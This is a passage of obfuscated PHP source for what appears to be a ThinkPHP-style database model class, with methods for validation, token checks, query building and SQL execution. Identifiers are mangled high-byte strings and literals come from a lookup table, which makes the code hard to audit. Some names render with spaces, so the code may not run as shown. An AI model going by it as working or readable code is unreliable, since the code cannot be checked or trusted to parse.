$»ëå‹í =& $_SERVER[® ¨Ä®ñ]; if ($»Ü˜‘ù) { if (is_callable($»Ü˜‘ù)) { return call_user_func($»Ü˜‘ù, $€ß­¤ÈÊ); } switch (strtolower($»Ü˜‘ù)) { case $»ëå‹í[289]: return json_encode($€ß­¤ÈÊ); case $»ëå‹í[290]: return xml_encode($€ß­¤ÈÊ); } } return $€ß­¤ÈÊ; } public function parseFieldsMap($Ğ“ÙğŠÄ, $ÉÈñ¹ğé = 1) { if (!empty($this->_map)) { foreach ($this->_map as $Ò£ÑÙˆˆ => $Š ï€äŠ) { if ($ÉÈñ¹ğé == 1) { if (isset($Ğ“ÙğŠÄ[$Š ï€äŠ])) { $Ğ“ÙğŠÄ[$Ò£ÑÙˆˆ] = $Ğ“ÙğŠÄ[$Š ï€äŠ]; unset($Ğ“ÙğŠÄ[$Š ï€äŠ]); } } else { if (isset($Ğ“ÙğŠÄ[$Ò£ÑÙˆˆ])) { $Ğ“ÙğŠÄ[$Š ï€äŠ] = $Ğ“ÙğŠÄ[$Ò£ÑÙˆˆ]; unset($Ğ“ÙğŠÄ[$Ò£ÑÙˆˆ]); } } } } return $Ğ“ÙğŠÄ; } public function setField($íŒÔÃà¿, $³âÄé°´ = '') { if (is_array($íŒÔÃà¿)) { $â´ÂÉŒ = $íŒÔÃà¿; } else { $â´ÂÉŒ[$íŒÔÃà¿] = $³âÄé°´; } return $this->save($â´ÂÉŒ); } public function setAdd($öó…„Û³, $˜ªìôñ¼ = 1) { $»¨„Êñ =& $_SERVER[® ¨Ä®ñ]; $ÚÍÉ§Œ = $öó…„Û³ . $»¨„Êñ[291] . $˜ªìôñ¼; if ($˜ªìôñ¼ < 0) { $ÚÍÉ§Œ = $öó…„Û³ . $˜ªìôñ¼; } return $this->setField($öó…„Û³, array($»¨„Êñ[292], $ÚÍÉ§Œ)); } public function getField($ˆ¡„­òà, $ÅÑäÖ£Ó = null) { $¦ÜÖ¸ô§ =& $_SERVER[® ¨Ä®ñ]; $óÍ®ùšµ[$¦ÜÖ¸ô§[268]] = $ˆ¡„­òà; $óÍ®ùšµ = $this->_parseOptions($óÍ®ùšµ); $ˆ¡„­òà = trim($ˆ¡„­òà); if (strpos($ˆ¡„­òà, $¦ÜÖ¸ô§[50])) { if (!isset($óÍ®ùšµ[$¦ÜÖ¸ô§[287]])) { $óÍ®ùšµ[$¦ÜÖ¸ô§[287]] = is_numeric($ÅÑäÖ£Ó) ? $ÅÑäÖ£Ó : $¦ÜÖ¸ô§[12]; } $´šËŠÃ¼ = $this->db->select($óÍ®ùšµ); if (!empty($´šËŠÃ¼)) { $è¬ôªÍ£ = explode($¦ÜÖ¸ô§[50], $ˆ¡„­òà); $ˆ¡„­òà = array_keys($´šËŠÃ¼[0]); $†í©îå = array_shift($ˆ¡„­òà); $’Á–ÊÑ¯ = array_shift($ˆ¡„­òà); $İ—Ò©Öâ = array(); $¾íÌÖª× = count($è¬ôªÍ£); foreach ($´šËŠÃ¼ as $İ”àíˆ´) { $İŠïóË÷ = $İ”àíˆ´[$†í©îå]; if (2 == $¾íÌÖª×) { $İ—Ò©Öâ[$İŠïóË÷] = $İ”àíˆ´[$’Á–ÊÑ¯]; } else { $İ—Ò©Öâ[$İŠïóË÷] = is_string($ÅÑäÖ£Ó) ? implode($ÅÑäÖ£Ó, $İ”àíˆ´) : $İ”àíˆ´; } } return $İ—Ò©Öâ; } } else { if (!0 !== $ÅÑäÖ£Ó) { $óÍ®ùšµ[$¦ÜÖ¸ô§[287]] = is_numeric($ÅÑäÖ£Ó) ? $ÅÑäÖ£Ó : 1; } if ($ÅÑäÖ£Ó === $¦ÜÖ¸ô§[250]) { unset($óÍ®ùšµ[$¦ÜÖ¸ô§[287]]); } $İ”àíˆ´ = $this->db->select($óÍ®ùšµ); if (!empty($İ”àíˆ´)) { if ($ÅÑäÖ£Ó === $¦ÜÖ¸ô§[250]) { return reset($İ”àíˆ´[0]); } if (!0 !== $ÅÑäÖ£Ó && 1 == $óÍ®ùšµ[$¦ÜÖ¸ô§[287]]) { return reset($İ”àíˆ´[0]); } foreach ($İ”àíˆ´ as $²Öš·î¢) { $¥Ç¥Èû[] = $²Öš·î¢[$ˆ¡„­òà]; } return $¥Ç¥Èû; } } return null; } public function create($Ô÷ÕÜ—Ñ = '', $ªñ ­ë‹ = '') { $Ñ´æ®÷ =& $_SERVER[® ¨Ä®ñ]; if (empty($Ô÷ÕÜ—Ñ)) { $Ô÷ÕÜ—Ñ = $_POST; } elseif (is_object($Ô÷ÕÜ—Ñ)) { $Ô÷ÕÜ—Ñ = get_object_vars($Ô÷ÕÜ—Ñ); } if (empty($Ô÷ÕÜ—Ñ) || !is_array($Ô÷ÕÜ—Ñ)) { $this->error = think_lang($Ñ´æ®÷[266]); return !1; } $Ô÷ÕÜ—Ñ = $this->parseFieldsMap($Ô÷ÕÜ—Ñ, 0); $ªñ ­ë‹ = $ªñ ­ë‹ ? $ªñ ­ë‹ : (!empty($Ô÷ÕÜ—Ñ[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$Ñ´æ®÷[268]])) { $—Äß¼Ùì = $this->options[$Ñ´æ®÷[268]]; unset($this->options[$Ñ´æ®÷[268]]); } elseif ($ªñ ­ë‹ == THINK_MODEL_INSERT && isset($this->insertFields)) { $—Äß¼Ùì = $this->insertFields; } elseif ($ªñ ­ë‹ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $—Äß¼Ùì = $this->updateFields; } if (isset($—Äß¼Ùì)) { if (is_string($—Äß¼Ùì)) { $—Äß¼Ùì = explode($Ñ´æ®÷[50], $—Äß¼Ùì); } if (think_config($Ñ´æ®÷[293])) { $—Äß¼Ùì[] = think_config($Ñ´æ®÷[294]); } foreach ($Ô÷ÕÜ—Ñ as $¶»´ßŠ‰ => $ØİŸØ•³) { if (!in_array($¶»´ßŠ‰, $—Äß¼Ùì)) { unset($Ô÷ÕÜ—Ñ[$¶»´ßŠ‰]); } } } if (!$this->autoValidation($Ô÷ÕÜ—Ñ, $ªñ ­ë‹)) { return !1; } if (!$this->autoCheckToken($Ô÷ÕÜ—Ñ)) { $this->error = think_lang($Ñ´æ®÷[295]); return !1; } if ($this->autoCheckFields) { $—Äß¼Ùì = $this->getDbFields(); foreach ($Ô÷ÕÜ—Ñ as $¶»´ßŠ‰ => $ØİŸØ•³) { if (!in_array($¶»´ßŠ‰, $—Äß¼Ùì)) { unset($Ô÷ÕÜ—Ñ[$¶»´ßŠ‰]); } elseif (MAGIC_QUOTES_GPC && is_string($ØİŸØ•³)) { $Ô÷ÕÜ—Ñ[$¶»´ßŠ‰] = stripslashes($ØİŸØ•³); } } } $this->autoOperation($Ô÷ÕÜ—Ñ, $ªñ ­ë‹); $this->data = $Ô÷ÕÜ—Ñ; return $Ô÷ÕÜ—Ñ; } public function autoCheckToken($¦à‹øå) { $¹„â¾Üä =& $_SERVER[® ¨Ä®ñ]; if (isset($this->options[$¹„â¾Üä[296]]) && !$this->options[$¹„â¾Üä[296]]) { return !0; } if (think_config($¹„â¾Üä[293])) { $¨º–¨ã´ = think_config($¹„â¾Üä[294]); if (!isset($¦à‹øå[$¨º–¨ã´]) || Session::get($¨º–¨ã´)) { return !1; } list($ô¿¸ , $çğüÓÕ³) = explode($¹„â¾Üä[11], $¦à‹øå[$¨º–¨ã´]); if ($çğüÓÕ³ && Session::get($¨º–¨ã´ . $¹„â¾Üä[10] . $ô¿¸ ) === $çğüÓÕ³) { Session::remove($¨º–¨ã´ . $¹„â¾Üä[10] . $ô¿¸ ); return !0; } if (think_config($¹„â¾Üä[297])) { Session::remove($¨º–¨ã´ . $¹„â¾Üä[10] . $ô¿¸ ); } return !1; } return !0; } public function regex($õ©Íæ›¦, $Ì¹ÇİáË) { $œÑĞÆÛ =& $_SERVER[® ¨Ä®ñ]; $õ„ŞÇ×« = array($œÑĞÆÛ[298] => $œÑĞÆÛ[299], $œÑĞÆÛ[300] => $œÑĞÆÛ[301], $œÑĞÆÛ[302] => $œÑĞÆÛ[303], $œÑĞÆÛ[304] => $œÑĞÆÛ[305], $œÑĞÆÛ[306] => $œÑĞÆÛ[307], $œÑĞÆÛ[308] => $œÑĞÆÛ[309], $œÑĞÆÛ[310] => $œÑĞÆÛ[311], $œÑĞÆÛ[285] => $œÑĞÆÛ[312], $œÑĞÆÛ[313] => $œÑĞÆÛ[314]); if (isset($õ„ŞÇ×«[strtolower($Ì¹ÇİáË)])) { $Ì¹ÇİáË = $õ„ŞÇ×«[strtolower($Ì¹ÇİáË)]; } return preg_match($Ì¹ÇİáË, $õ©Íæ›¦) === 1; } private function autoOperation(&$Ö±–•€Á, $ß¬Ëì) { $›Ü—¿´ù =& $_SERVER[® ¨Ä®ñ]; if (!empty($this->options[$›Ü—¿´ù[315]])) { $ù¹ïİú¸ = $this->options[$›Ü—¿´ù[315]]; unset($this->options[$›Ü—¿´ù[315]]); } elseif (!empty($this->_auto)) { $ù¹ïİú¸ = $this->_auto; } if (isset($ù¹ïİú¸)) { foreach ($ù¹ïİú¸ as $Ú½‹Ê…Ø) { if (empty($Ú½‹Ê…Ø[2])) { $Ú½‹Ê…Ø[2] = THINK_MODEL_INSERT; } if ($ß¬Ëì == $Ú½‹Ê…Ø[2] || $Ú½‹Ê…Ø[2] == THINK_MODEL_BOTH) { switch (trim($Ú½‹Ê…Ø[3])) { case $›Ü—¿´ù[316]: case $›Ü—¿´ù[317]: $Ê§—â¿ = isset($Ú½‹Ê…Ø[4]) ? (array) $Ú½‹Ê…Ø[4] : array(); if (isset($Ö±–•€Á[$Ú½‹Ê…Ø[0]])) { array_unshift($Ê§—â¿, $Ö±–•€Á[$Ú½‹Ê…Ø[0]]); } if ($›Ü—¿´ù[316] == $Ú½‹Ê…Ø[3]) { $Ö±–•€Á[$Ú½‹Ê…Ø[0]] = call_user_func_array($Ú½‹Ê…Ø[1], $Ê§—â¿); } else { $Ö±–•€Á[$Ú½‹Ê…Ø[0]] = call_user_func_array(array(&$this, $Ú½‹Ê…Ø[1]), $Ê§—â¿); } break; case $›Ü—¿´ù[268]: $Ö±–•€Á[$Ú½‹Ê…Ø[0]] = $Ö±–•€Á[$Ú½‹Ê…Ø[1]]; break; case $›Ü—¿´ù[318]: if ($›Ü—¿´ù[12] === $Ö±–•€Á[$Ú½‹Ê…Ø[0]]) { unset($Ö±–•€Á[$Ú½‹Ê…Ø[0]]); } break; case $›Ü—¿´ù[319]: default: $Ö±–•€Á[$Ú½‹Ê…Ø[0]] = $Ú½‹Ê…Ø[1]; } if (!1 === $Ö±–•€Á[$Ú½‹Ê…Ø[0]]) { unset($Ö±–•€Á[$Ú½‹Ê…Ø[0]]); } } } } return $Ö±–•€Á; } protected function autoValidation($¶õœÃÖÒ, $¶ô«œÌ) { $îÏı¶Şí =& $_SERVER[® ¨Ä®ñ]; if (!empty($this->options[$îÏı¶Şí[320]])) { $Ú›±õ™Ë = $this->options[$îÏı¶Şí[320]]; unset($this->options[$îÏı¶Şí[320]]); } elseif (!empty($this->_validate)) { $Ú›±õ™Ë = $this->_validate; } if (isset($Ú›±õ™Ë)) { if ($this->patchValidate) { $this->error = array(); } foreach ($Ú›±õ™Ë as $Ñ›—¬’ => $Ûò—ŸŒ) { if (empty($Ûò—ŸŒ[5]) || $Ûò—ŸŒ[5] == THINK_MODEL_BOTH || $Ûò—ŸŒ[5] == $¶ô«œÌ) { if (0 == strpos($Ûò—ŸŒ[2], $îÏı¶Şí[321]) && strpos($Ûò—ŸŒ[2], $îÏı¶Şí[322])) { $Ûò—ŸŒ[2] = think_lang(substr($Ûò—ŸŒ[2], 2, -1)); } $Ûò—ŸŒ[3] = isset($Ûò—ŸŒ[3]) ? $Ûò—ŸŒ[3] : THINK_EXISTS_VALIDATE; $Ûò—ŸŒ[4] = isset($Ûò—ŸŒ[4]) ? $Ûò—ŸŒ[4] : $îÏı¶Şí[323]; switch ($Ûò—ŸŒ[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($¶õœÃÖÒ, $Ûò—ŸŒ)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($îÏı¶Şí[12] != trim($¶õœÃÖÒ[$Ûò—ŸŒ[0]])) { if (!1 === $this->_validationField($¶õœÃÖÒ, $Ûò—ŸŒ)) { return !1; } } break; default: if (isset($¶õœÃÖÒ[$Ûò—ŸŒ[0]])) { if (!1 === $this->_validationField($¶õœÃÖÒ, $Ûò—ŸŒ)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($¥şÅàÈ, $¿Ïà’ôî) { if (!1 === $this->_validationFieldItem($¥şÅàÈ, $¿Ïà’ôî)) { if ($this->patchValidate) { $this->error[$¿Ïà’ôî[0]] = $¿Ïà’ôî[2]; } else { $this->error = $¿Ïà’ôî[2]; return !1; } } return; } protected function _validationFieldItem($»í¯¬„Ã, $·Şè¸ªÀ) { $î¬í·Ï =& $_SERVER[® ¨Ä®ñ]; switch (strtolower(trim($·Şè¸ªÀ[4]))) { case $î¬í·Ï[316]: case $î¬í·Ï[317]: $üªñ–»Š = isset($·Şè¸ªÀ[6]) ? (array) $·Şè¸ªÀ[6] : array(); if (is_string($·Şè¸ªÀ[0]) && strpos($·Şè¸ªÀ[0], $î¬í·Ï[50])) { $·Şè¸ªÀ[0] = explode($î¬í·Ï[50], $·Şè¸ªÀ[0]); } if (is_array($·Şè¸ªÀ[0])) { foreach ($·Şè¸ªÀ[0] as $¬ºå²¨Ü) { $Á¤Ì›†º[$¬ºå²¨Ü] = $»í¯¬„Ã[$¬ºå²¨Ü]; } array_unshift($üªñ–»Š, $Á¤Ì›†º); } else { array_unshift($üªñ–»Š, $»í¯¬„Ã[$·Şè¸ªÀ[0]]); } if ($î¬í·Ï[316] == $·Şè¸ªÀ[4]) { return call_user_func_array($·Şè¸ªÀ[1], $üªñ–»Š); } else { return call_user_func_array(array(&$this, $·Şè¸ªÀ[1]), $üªñ–»Š); } case $î¬í·Ï[324]: return $»í¯¬„Ã[$·Şè¸ªÀ[0]] == $»í¯¬„Ã[$·Şè¸ªÀ[1]]; case $î¬í·Ï[325]: if (is_string($·Şè¸ªÀ[0]) && strpos($·Şè¸ªÀ[0], $î¬í·Ï[50])) { $·Şè¸ªÀ[0] = explode($î¬í·Ï[50], $·Şè¸ªÀ[0]); } $¥¾Å  Ï = array(); if (is_array($·Şè¸ªÀ[0])) { foreach ($·Şè¸ªÀ[0] as $¬ºå²¨Ü) { $¥¾Å  Ï[$¬ºå²¨Ü] = $»í¯¬„Ã[$¬ºå²¨Ü]; } } else { $¥¾Å  Ï[$·Şè¸ªÀ[0]] = $»í¯¬„Ã[$·Şè¸ªÀ[0]]; } if (!empty($»í¯¬„Ã[$this->getPk()])) { $¥¾Å  Ï[$this->getPk()] = array($î¬í·Ï[326], $»í¯¬„Ã[$this->getPk()]); } if ($this->where($¥¾Å  Ï)->find()) { return !1; } return !0; default: return $this->check($»í¯¬„Ã[$·Şè¸ªÀ[0]], $·Şè¸ªÀ[1], $·Şè¸ªÀ[4]); } } public function check($‚àËÔìé, $êÔİøµ, $ç›åû´½ = "\x72\x65\147\x65\170") { $€ÎŒÜšš =& $_SERVER[® ¨Ä®ñ]; $ç›åû´½ = strtolower(trim($ç›åû´½)); switch ($ç›åû´½) { case $€ÎŒÜšš[7]: case $€ÎŒÜšš[327]: $Âµº“î¸ = is_array($êÔİøµ) ? $êÔİøµ : explode($€ÎŒÜšš[50], $êÔİøµ); return $ç›åû´½ == $€ÎŒÜšš[7] ? in_array($‚àËÔìé, $Âµº“î¸) : !in_array($‚àËÔìé, $Âµº“î¸); case $€ÎŒÜšš[328]: case $€ÎŒÜšš[329]: if (is_array($êÔİøµ)) { $ï¬¬ˆë§ = $êÔİøµ[0]; $Ñıõ¡¤ = $êÔİøµ[1]; } else { list($ï¬¬ˆë§, $Ñıõ¡¤) = explode($€ÎŒÜšš[50], $êÔİøµ); } return $ç›åû´½ == $€ÎŒÜšš[328] ? $‚àËÔìé >= $ï¬¬ˆë§ && $‚àËÔìé <= $Ñıõ¡¤ : $‚àËÔìé < $ï¬¬ˆë§ || $‚àËÔìé > $Ñıõ¡¤; case $€ÎŒÜšš[330]: case $€ÎŒÜšš[331]: return $ç›åû´½ == $€ÎŒÜšš[330] ? $‚àËÔìé == $êÔİøµ : $‚àËÔìé != $êÔİøµ; case $€ÎŒÜšš[332]: $³ÃãÛÏÕ = mb_strlen($‚àËÔìé, $€ÎŒÜšš[333]); if (strpos($êÔİøµ, $€ÎŒÜšš[50])) { list($ï¬¬ˆë§, $Ñıõ¡¤) = explode($€ÎŒÜšš[50], $êÔİøµ); return $³ÃãÛÏÕ >= $ï¬¬ˆë§ && $³ÃãÛÏÕ <= $Ñıõ¡¤; } else { return $³ÃãÛÏÕ == $êÔİøµ; } case $€ÎŒÜšš[334]: list($Å•î½åÁ, $áüéœşí) = explode($€ÎŒÜšš[50], $êÔİøµ); if (!is_numeric($Å•î½åÁ)) { $Å•î½åÁ = strtotime($Å•î½åÁ); } if (!is_numeric($áüéœşí)) { $áüéœşí = strtotime($áüéœşí); } return NOW_TIME >= $Å•î½åÁ && NOW_TIME <= $áüéœşí; case $€ÎŒÜšš[335]: return in_array(get_client_ip(), explode($€ÎŒÜšš[50], $êÔİøµ)); case $€ÎŒÜšš[336]: return !in_array(get_client_ip(), explode($€ÎŒÜšš[50], $êÔİøµ)); case $€ÎŒÜšš[323]: default: return $this->regex($‚àËÔìé, $êÔİøµ); } } public function query($˜æŸĞ‡, $¢õö•µ = false) { $éÆİä«’ =& $_SERVER[® ¨Ä®ñ]; if (!is_bool($¢õö•µ) && !is_array($¢õö•µ)) { $¢õö•µ = func_get_args(); array_shift($¢õö•µ); } $˜æŸĞ‡ = str_replace(array($éÆİä«’[226], $éÆİä«’[337]), $éÆİä«’[53], $˜æŸĞ‡); $˜æŸĞ‡ = $this->parseSql($˜æŸĞ‡, $¢õö•µ); return $this->db->query($˜æŸĞ‡); } public function execute($ŠÍ«ªÆ, $ÃñÈÂ•µ = false) { if (!is_bool($ÃñÈÂ•µ) && !is_array($ÃñÈÂ•µ)) { $ÃñÈÂ•µ = func_get_args(); array_shift($ÃñÈÂ•µ); } $ŠÍ«ªÆ = $this->parseSql($ŠÍ«ªÆ, $ÃñÈÂ•µ); return $this->db->execute($ŠÍ«ªÆ); } protected function parseSql($ü¤‘ÅÙÜ, $úœ ”ï«) { $¹ô¨½–ö =& $_SERVER[® ¨Ä®ñ]; if (!0 === $úœ ”ï«) { $É”È©ä‚ = $this->_parseOptions(); $ü¤‘ÅÙÜ = $this->db->parseSql($ü¤‘ÅÙÜ, $É”È©ä‚); } elseif (is_array($úœ ”ï«)) { $úœ ”ï« = array_map(array($this->db, $¹ô¨½–ö[338]), $úœ ”ï«); $ü¤‘ÅÙÜ = vsprintf($ü¤‘ÅÙÜ, $úœ ”ï«); } else { $ü¤‘ÅÙÜ = strtr($ü¤‘ÅÙÜ, array($¹ô¨½–ö[339] => $this->getTableName(), $¹ô¨½–ö[340] => think_config($¹ô¨½–ö[239]))); } $this->db->setModel($this->name); return $ü¤‘ÅÙÜ; } public function db($°¸ğåâ¨ = '', $Àİ”£ûÉ = '', $ûƒ˜Åµ› = array()) { $ßÑ¥Ã¦Õ =& $_SERVER[® ¨Ä®ñ]; if ($ßÑ¥Ã¦Õ[12] === $°¸ğåâ¨ && $this->db) { return $this->db; } static $×ÛëŠ²Š = array(); static $ÈŸì±ØÛ = array(); if (!isset($ÈŸì±ØÛ[$°¸ğåâ¨]) || isset($ÈŸì±ØÛ[$°¸ğåâ¨]) && $Àİ”£ûÉ && $×ÛëŠ²Š[$°¸ğåâ¨] != $Àİ”£ûÉ) { if (!empty($Àİ”£ûÉ) && is_string($Àİ”£ûÉ) && !1 === strpos($Àİ”£ûÉ, $ßÑ¥Ã¦Õ[8])) { $Àİ”£ûÉ = think_config($Àİ”£ûÉ); } $°¸ğåâ¨ = think_guid($Àİ”£ûÉ); $ÈŸì±ØÛ[$°¸ğåâ¨] = Db::getInstance($Àİ”£ûÉ); } elseif (NULL === $Àİ”£ûÉ) { $ÈŸì±ØÛ[$°¸ğåâ¨]->close(); unset($ÈŸì±ØÛ[$°¸ğåâ¨]); return; } if (!empty($ûƒ˜Åµ›)) { if (is_string($ûƒ˜Åµ›)) { parse_str($ûƒ˜Åµ›, $ûƒ˜Åµ›); } foreach ($ûƒ˜Åµ› as $ä‚³ûêæ => $ïâü‘ò½) { $this->setProperty($ä‚³ûêæ, $ïâü‘ò½); } } $×ÛëŠ²Š[$°¸ğåâ¨] = $Àİ”£ûÉ; $this->db = $ÈŸì±ØÛ[$°¸ğåâ¨]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $¢³Ÿ§‚Ó = get_class($this); if ($¢³Ÿ§‚Ó == $_SERVER[® ¨Ä®ñ][341]) { return $this->name; } $this->name = substr($¢³Ÿ§‚Ó, 0, -5); } return $this->name; } public function getTableName() { $ïğ†»Ù =& $_SERVER[® ¨Ä®ñ]; if (empty($this->trueTableName)) { $Ş×áâÒ· = !empty($this->tablePrefix) ? $this->tablePrefix : $ïğ†»Ù[12]; if (!empty($this->tableName)) { $Ş×áâÒ· .= $this->tableName; } else { $Ş×áâÒ· .= think_parse_name($this->name); } $this->trueTableName = strtolower($Ş×áâÒ·); } return (!empty($this->dbName) ? $this->dbName . $ïğ†»Ù[10] : $ïğ†»Ù[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $ùŞÇ§å =& $_SERVER[® ¨Ä®ñ]; return isset($this->fields[$ùŞÇ§å[246]]) ? $this->fields[$ùŞÇ§å[246]] : $this->pk; } public function getDbFields() { $ÊËšŠø¬ =& $_SERVER[® ¨Ä®ñ]; if (isset($this->options[$ÊËšŠø¬[274]])) { $é¤ÖÕ‚ = $this->db->getFields($this->options[$ÊËšŠø¬[274]]); return $é¤ÖÕ‚ ? array_keys($é¤ÖÕ‚) : !1; } if ($this->fields) { $é¤ÖÕ‚ = $this->fields; unset($é¤ÖÕ‚[$ÊËšŠø¬[245]], $é¤ÖÕ‚[$ÊËšŠø¬[246]], $é¤ÖÕ‚[$ÊËšŠø¬[247]], $é¤ÖÕ‚[$ÊËšŠø¬[244]]); return $é¤ÖÕ‚; } return !1; } public function data($†„ˆïŸ = '') { $òÑÅüœ =& $_SERVER[® ¨Ä®ñ]; if ($òÑÅüœ[12] === $†„ˆïŸ && !empty($this->data)) { return $this->data; } if (is_object($†„ˆïŸ)) { $†„ˆïŸ = get_object_vars($†„ˆïŸ); } elseif (is_string($†„ˆïŸ)) { parse_str($†„ˆïŸ, $†„ˆïŸ); } elseif (!is_array($†„ˆïŸ)) { think_exception(think_lang($òÑÅüœ[266])); } $this->data = $†„ˆïŸ; return $this; } public function join($Ø¢äıÈ) { $ãÒ¿ë±Ğ =& $_SERVER[® ¨Ä®ñ]; if (is_array($Ø¢äıÈ)) { $this->options[$ãÒ¿ë±Ğ[277]] = $Ø¢äıÈ; } elseif (!empty($Ø¢äıÈ)) { $this->options[$ãÒ¿ë±Ğ[277]][] = $Ø¢äıÈ; } return $this; } public function union($«Óá°Àİ, $ü¡Ìõ’ä = false) { $É¯Ê˜Û =& $_SERVER[® ¨Ä®ñ]; if (empty($«Óá°Àİ)) { return $this; } if ($ü¡Ìõ’ä) { $this->options[$É¯Ê˜Û[342]][$É¯Ê˜Û[343]] = !0; } if (is_object($«Óá°Àİ)) { $«Óá°Àİ = get_object_vars($«Óá°Àİ); } if (is_string($«Óá°Àİ)) { $ä­ïĞ€ = $«Óá°Àİ; } elseif (is_array($«Óá°Àİ)) { if (isset($«Óá°Àİ[0])) { $this->options[$É¯Ê˜Û[342]] = array_merge($this->options[$É¯Ê˜Û[342]], $«Óá°Àİ); return $this; } else { $ä­ïĞ€ = $«Óá°Àİ; } } else { think_exception(think_lang($É¯Ê˜Û[266])); } $this->options[$É¯Ê˜Û[342]][] = $ä­ïĞ€; return $this; } public function cache($©É†‡—è = true, $Ò‰æÆœõ = null, $ĞÏµÉ„ = '') { $¾¤µçª× =& $_SERVER[® ¨Ä®ñ]; if (!1 !== $©É†‡—è) { $this->options[$¾¤µçª×[344]] = array($¾¤µçª×[95] => $©É†‡—è, $¾¤µçª×[334] => $Ò‰æÆœõ, $¾¤µçª×[33] => $ĞÏµÉ„); } return $this; } public function field($÷ÇÅ²Ó¦, $ä…ˆ™ËÛ = false) { $Ùğ´æì° =& $_SERVER[® ¨Ä®ñ]; if (!0 === $÷ÇÅ²Ó¦) { $ŸñÚÃÓÛ = $this->getDbFields(); $÷ÇÅ²Ó¦ = $ŸñÚÃÓÛ ? $ŸñÚÃÓÛ : $Ùğ´æì°[181]; } elseif ($ä…ˆ™ËÛ) { if (is_string($÷ÇÅ²Ó¦)) { $÷ÇÅ²Ó¦ = explode($Ùğ´æì°[50], $÷ÇÅ²Ó¦); } $ŸñÚÃÓÛ = $this->getDbFields(); $÷ÇÅ²Ó¦ = $ŸñÚÃÓÛ ? array_diff($ŸñÚÃÓÛ, $÷ÇÅ²Ó¦) : $÷ÇÅ²Ó¦; } $this->options[$Ùğ´æì°[268]] = $÷ÇÅ²Ó¦; return $this; } public function scope($Ã›ë»êğ = '', $Øª¹è»‡ = NULL) { $å°›µâ¿ =& $_SERVER[® ¨Ä®ñ]; if ($å°›µâ¿[12] === $Ã›ë»êğ) { if (isset($this->_scope[$å°›µâ¿[37]])) { $úÀ…·Ú¤ = $this->_scope[$å°›µâ¿[37]]; } else { return $this; } } elseif (is_string($Ã›ë»êğ)) { $îÔïêˆ€ = explode($å°›µâ¿[50], $Ã›ë»êğ); $úÀ…·Ú¤ = array(); foreach ($îÔïêˆ€ as $şÆ¿Ä) { if (!isset($this->_scope[$şÆ¿Ä])) { continue; } $úÀ…·Ú¤ = array_merge($úÀ…·Ú¤, $this->_scope[$şÆ¿Ä]); } if (!empty($Øª¹è»‡) && is_array($Øª¹è»‡)) { $úÀ…·Ú¤ = array_merge($úÀ…·Ú¤, $Øª¹è»‡); } } elseif (is_array($Ã›ë»êğ)) { $úÀ…·Ú¤ = $Ã›ë»êğ; } if (is_array($úÀ…·Ú¤) && !empty($úÀ…·Ú¤)) { $this->options = array_merge($this->options, array_change_key_case($úÀ…·Ú¤)); } return $this; } public function where($Ò·¨‚×‡, $¥±«õ‹É = null) { $±¼ñÖÛÉ =& $_SERVER[® ¨Ä®ñ]; if (!is_null($¥±«õ‹É) && is_string($Ò·¨‚×‡)) { if (!is_array($¥±«õ‹É)) { $¥±«õ‹É = func_get_args(); array_shift($¥±«õ‹É); } $¥±«õ‹É = array_map(array($this->db, $±¼ñÖÛÉ[338]), $¥±«õ‹É); $Ò·¨‚×‡ = vsprintf($Ò·¨‚×‡, $¥±«õ‹É); } elseif (is_object($Ò·¨‚×‡)) { $Ò·¨‚×‡ = get_object_vars($Ò·¨‚×‡); } elseif (is_array($Ò·¨‚×‡)) { foreach ($Ò·¨‚×‡ as $æ’“Åîş => $¢Ä›²Ê˜) { if ((is_numeric($æ’“Åîş) || !$æ’“Åîş) && is_string($¢Ä›²Ê˜)) { if (strpos($¢Ä›²Ê˜, $±¼ñÖÛÉ[345]) === 0) { continue; } think_trace($±¼ñÖÛÉ[346], $±¼ñÖÛÉ[12], $±¼ñÖÛÉ[49]); die; } } } if (is_string($Ò·¨‚×‡) && $±¼ñÖÛÉ[12] != $Ò·¨‚×‡) { $‚Å¿²†™ = array(); $‚Å¿²†™[$±¼ñÖÛÉ[347]] = $Ò·¨‚×‡; $Ò·¨‚×‡ = $‚Å¿²†™; } if (isset($this->options[$±¼ñÖÛÉ[270]])) { $this->options[$±¼ñÖÛÉ[270]] = array_merge($this->options[$±¼ñÖÛÉ[270]], $Ò·¨‚×‡); } else { $this->options[$±¼ñÖÛÉ[270]] = $Ò·¨‚×‡; } return $this; } public function limit($èË ”½, $´è—ÆŠ = null) { $«ÀŒ–şŸ =& $_SERVER[® ¨Ä®ñ]; $this->options[$«ÀŒ–şŸ[287]] = is_null($´è—ÆŠ) ? $èË ”½ : $èË ”½ . $«ÀŒ–şŸ[50] . $´è—ÆŠ; return $this; } public function page($¶ÙÀŠÙÆ, $§¼—ú×´ = null) { $ÁñÔ°¯† =& $_SERVER[® ¨Ä®ñ]; $this->options[$ÁñÔ°¯†[348]] = is_null($§¼—ú×´) ? $¶ÙÀŠÙÆ : $¶ÙÀŠÙÆ . $ÁñÔ°¯†[50] . $§¼—ú×´; return $this; } public function comment($Ò“µßù÷) { $this->options[$_SERVER[® ¨Ä®ñ][349]] = $Ò“µßù÷; return $this; } public function setProperty($Í’üì¥Ô, $µ²±ÑËÆ) { if (property_exists($this, $Í’üì¥Ô)) { $this->{$Í’üì¥Ô} = $µ²±ÑËÆ; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\x6f\x64\x69\146\x79\124\151\x6d\x65", "\164\151\155\145", "\x69\156\x73\145\x72\x74\x2c\165\160\x64\x61\x74\x65", "\146\x75\156\143\x74\x69\157\156"), array("\143\162\x65\141\x74\x65\x54\x69\x6d\x65", "\164\151\155\145", "\151\156\x73\x65\x72\x74", "\146\165\x6e\143\164\151\x6f\x6e")); public function setDataAuto($Ê‹°ñ…Ú) { 